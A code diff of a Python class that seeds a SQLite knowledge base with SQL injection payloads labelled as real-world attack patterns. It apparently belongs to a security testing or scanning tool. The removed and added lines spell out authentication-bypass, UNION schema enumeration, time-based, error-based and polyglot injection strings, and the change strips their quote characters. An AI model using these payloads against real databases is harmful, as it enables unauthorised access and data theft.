@@ -141,18 +141,18 @@ class ExperienceManager:
     def _seed_knowledge(self):
         """Seeds the database with real-world attack patterns."""
         payloads = [
-            ("admin'--", "REAL_WORLD_AUTH"),
-            ("' OR '1'='1", "REAL_WORLD_AUTH"),
-            ("1' UNION SELECT NULL,NULL,NULL--", "REAL_WORLD_UNION"),
-            ("-1' UNION SELECT 1,database(),user()--", "REAL_WORLD_UNION"),
-            ("1' AND SLEEP(5)--", "REAL_WORLD_TIME"),
+            ("admin--", "REAL_WORLD_AUTH"),
+            ("1 OR 1=1", "REAL_WORLD_AUTH"),
+            ("1 UNION SELECT NULL,NULL,NULL--", "REAL_WORLD_UNION"),
+            ("-1 UNION SELECT 1,database(),user()--", "REAL_WORLD_UNION"),
+            ("1 AND SLEEP(5)--", "REAL_WORLD_TIME"),
             ("1/*!50000OR*/1=1", "REAL_WORLD_WAF"),
-            ("1' AND extractvalue(1,concat(0x7e,(select database())))--", "REAL_WORLD_ERROR"),
-            ("admin' #", "REAL_WORLD_AUTH"),
-            ("' OR 1=1--", "REAL_WORLD_AUTH"),
-            ("1' UNION SELECT NULL,table_name FROM information_schema.tables--", "REAL_WORLD_SCHEMA"),
-            ("1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,database(),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--", "REAL_WORLD_ERROR"),
-            ("SLEEP(5) /*' or SLEEP(5) or '\" or SLEEP(5) or \"*/", "REAL_WORLD_POLYGLOT")
+            ("1 AND extractvalue(1,concat(0x7e,(select database())))--", "REAL_WORLD_ERROR"),
+            ("admin #", "REAL_WORLD_AUTH"),
+            ("1 OR 1=1--", "REAL_WORLD_AUTH"),
+            ("1 UNION SELECT NULL,table_name FROM information_schema.tables--", "REAL_WORLD_SCHEMA"),
+            ("1 AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,database(),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--", "REAL_WORLD_ERROR"),
+            ("SLEEP(5) /* or SLEEP(5) or \"*/", "REAL_WORLD_POLYGLOT")
         ]
         try:
             conn = sqlite3.connect(self.db_path)
